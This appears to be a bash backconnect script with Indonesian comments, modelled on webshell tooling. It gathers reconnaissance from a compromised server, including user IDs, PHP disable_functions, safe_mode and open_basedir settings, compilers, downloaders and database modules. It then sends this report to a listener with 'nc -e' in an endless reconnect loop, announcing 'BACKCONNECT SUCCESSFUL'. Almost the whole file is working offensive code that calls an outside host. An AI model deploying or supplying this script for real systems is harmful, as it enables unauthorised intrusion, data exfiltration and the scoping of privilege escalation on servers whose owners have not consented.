#!/bin/bash

# Konfigurasi
TARGET_IP="192.168.1.100"  # Ganti dengan IP client Anda
TARGET_PORT="2500"         # Port yang Anda dengarkan di client
RECONNECT_INTERVAL=5       # Interval reconnect (detik)

# Fungsi untuk mendapatkan informasi sistem
get_system_info() {
    # Uname
    UNAME=$(uname -a)
    
    # User dan Group
    USER_INFO=$(id -un)
    GROUP_INFO=$(id -gn)
    UID_NUM=$(id -u)
    GID_NUM=$(id -g)
    
    # PHP dan Safe Mode (jika ada)
    if command -v php >/dev/null 2>&1; then
        PHP_VERSION=$(php -v | head -n1 | cut -d' ' -f2)
        SAFE_MODE=$(php -i 2>/dev/null | grep "safe_mode" | head -n1 | cut -d' ' -f3)
    else
        PHP_VERSION="Not Installed"
        SAFE_MODE="N/A"
    fi
    
    # IP Server dan IP Client
    SERVER_IP=$(hostname -I | awk '{print $1}')
    CLIENT_IP=$TARGET_IP
    
    # DateTime
    DATETIME=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Domains (jika ada)
    if [ -f /etc/named.conf ]; then
        DOMAINS=$(grep -E 'zone "' /etc/named.conf | wc -l)
    else
        DOMAINS="Cant Read [ /etc/named.conf ]"
    fi
    
    # HDD
    HDD_INFO=$(df -h / | awk 'NR==2 {print "Total:"$2 " Free:"$4 " ["$5"]"}')
    
    # Useful Commands
    USEFUL="gcc cc ld make php perl python tar gzip locate"
    
    # Downloader
    DOWNLOADER=""
    command -v wget >/dev/null 2>&1 && DOWNLOADER="${DOWNLOADER}wget "
    command -v curl >/dev/null 2>&1 && DOWNLOADER="${DOWNLOADER}curl"
    
    # Disable Functions (untuk PHP)
    if command -v php >/dev/null 2>&1; then
        DISABLE_FUNCTIONS=$(php -i 2>/dev/null | grep "disable_functions" | cut -d' ' -f3-)
        if [ -z "$DISABLE_FUNCTIONS" ]; then
            DISABLE_FUNCTIONS="All Functions Accessible"
        fi
    else
        DISABLE_FUNCTIONS="PHP Not Installed"
    fi
    
    # PHP Modules
    CURL_STATUS=$(php -m 2>/dev/null | grep -i curl >/dev/null 2>&1 && echo "ON" || echo "OFF")
    SSH2_STATUS=$(php -m 2>/dev/null | grep -i ssh2 >/dev/null 2>&1 && echo "ON" || echo "OFF")
    MAGIC_QUOTES=$(php -i 2>/dev/null | grep "magic_quotes_gpc" | head -n1 | cut -d' ' -f3)
    MYSQL_STATUS=$(php -m 2>/dev/null | grep -i mysqli >/dev/null 2>&1 && echo "ON" || echo "OFF")
    MSSQL_STATUS=$(php -m 2>/dev/null | grep -i mssql >/dev/null 2>&1 && echo "ON" || echo "OFF")
    PGSQL_STATUS=$(php -m 2>/dev/null | grep -i pgsql >/dev/null 2>&1 && echo "ON" || echo "OFF")
    ORACLE_STATUS=$(php -m 2>/dev/null | grep -i oci8 >/dev/null 2>&1 && echo "ON" || echo "OFF")
    CGI_STATUS=$(php -m 2>/dev/null | grep -i cgi >/dev/null 2>&1 && echo "ON" || echo "OFF")
    
    # Open_basedir, etc.
    OPEN_BASEDIR=$(php -i 2>/dev/null | grep "open_basedir" | cut -d' ' -f3-)
    SAFE_MODE_EXEC_DIR=$(php -i 2>/dev/null | grep "safe_mode_exec_dir" | cut -d' ' -f3-)
    SAFE_MODE_INCLUDE_DIR=$(php -i 2>/dev/null | grep "safe_mode_include_dir" | cut -d' ' -f3-)
    
    # Software Web Server
    if command -v apache2 >/dev/null 2>&1; then
        SOFTWARE=$(apache2 -v | head -n1)
    elif command -v httpd >/dev/null 2>&1; then
        SOFTWARE=$(httpd -v | head -n1)
    elif command -v nginx >/dev/null 2>&1; then
        SOFTWARE=$(nginx -v 2>&1)
    else
        SOFTWARE="Unknown"
    fi
}

# Fungsi untuk mengirim informasi dengan warna
send_info() {
    get_system_info
    
    # Header
    echo -e "\e[1;32m========================================\e[0m"
    echo -e "\e[1;31m      BACKCONNECT SUCCESSFUL\e[0m"
    echo -e "\e[1;32m========================================\e[0m"
    echo ""
    
    # Uname
    echo -e "\e[1;33mUname:\e[0m\t\e[1;37m$UNAME\e[0m"
    
    # User dan Group
    echo -e "\e[1;33mUser:\e[0m\t\e[1;37m$UID_NUM [ $USER_INFO ] Group: $GID_NUM [ $GROUP_INFO ]\e[0m"
    
    # PHP
    echo -e "\e[1;33mPHP:\e[0m\t\e[1;37m$PHP_VERSION Safe Mode: $SAFE_MODE\e[0m"
    
    # IP
    echo -e "\e[1;33mServerIP:\e[0m\t\e[1;37m$SERVER_IP Your IP: $CLIENT_IP\e[0m"
    
    # DateTime
    echo -e "\e[1;33mDateTime:\e[0m\t\e[1;37m$DATETIME\e[0m"
    
    # Domains
    echo -e "\e[1;33mDomains:\e[0m\t\e[1;37m$DOMAINS\e[0m"
    
    # HDD
    echo -e "\e[1;33mHDD:\e[0m\t\e[1;37m$HDD_INFO\e[0m"
    
    # Useful
    echo -e "\e[1;33mUseful :\e[0m\t\e[1;37m$USEFUL\e[0m"
    
    # Downloader
    echo -e "\e[1;33mDownloader:\e[0m\t\e[1;37m$DOWNLOADER\e[0m"
    
    # Disable Functions
    echo -e "\e[1;33mDisable Functions:\e[0m\t\e[1;37m$DISABLE_FUNCTIONS\e[0m"
    
    # PHP Modules
    echo -e "\e[1;33mCURL :\e[0m\t\e[1;37m$CURL_STATUS | SSH2 : $SSH2_STATUS | Magic Quotes : $MAGIC_QUOTES | MySQL : $MYSQL_STATUS | MSSQL : $MSSQL_STATUS | PostgreSQL : $PGSQL_STATUS | Oracle : $ORACLE_STATUS | CGI : $CGI_STATUS\e[0m"
    
    # Open_basedir, etc.
    echo -e "\e[1;33mOpen_basedir :\e[0m\t\e[1;37m$OPEN_BASEDIR | Safe_mode_exec_dir : $SAFE_MODE_EXEC_DIR | Safe_mode_include_dir : $SAFE_MODE_INCLUDE_DIR\e[0m"
    
    # Software
    echo -e "\e[1;33mSoftWare:\e[0m\t\e[1;37m$SOFTWARE\e[0m"
    
    echo ""
    echo -e "\e[1;32m========================================\e[0m"
    echo -e "\e[1;31m            END OF INFO\e[0m"
    echo -e "\e[1;32m========================================\e[0m"
    echo ""
}

# Fungsi backconnect
backconnect() {
    while true; do
        echo "[*] Mencoba koneksi ke $TARGET_IP:$TARGET_PORT..."
        
        # Buat script sementara yang berisi fungsi dan panggil send_info
        TEMP_SCRIPT=$(mktemp)
        echo "#!/bin/bash" > $TEMP_SCRIPT
        declare -f get_system_info >> $TEMP_SCRIPT
        declare -f send_info >> $TEMP_SCRIPT
        echo "send_info" >> $TEMP_SCRIPT
        chmod +x $TEMP_SCRIPT
        
        # Jalankan netcat dengan mengeksekusi script sementara
        nc -nv $TARGET_IP $TARGET_PORT -e $TEMP_SCRIPT
        
        # Hapus script sementara
        rm -f $TEMP_SCRIPT
        
        # Jika koneksi gagal/terputus
        echo "[!] Koneksi terputus! Reconnect dalam $RECONNECT_INTERVAL detik..."
        sleep $RECONNECT_INTERVAL
    done
}

# Jalankan backconnect
backconnect
